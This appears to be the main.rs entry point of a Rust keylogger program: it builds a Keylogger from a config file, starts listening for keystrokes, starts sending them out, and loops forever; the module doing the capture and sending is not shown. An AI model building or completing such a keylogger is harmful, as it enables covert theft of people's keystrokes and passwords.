mod keylogger;

use keylogger::Keylogger;

fn main() {
    let keylogger: Keylogger = Keylogger::new("./src/config.json");

    keylogger.listen();
    keylogger.start_sending();

    loop {}
}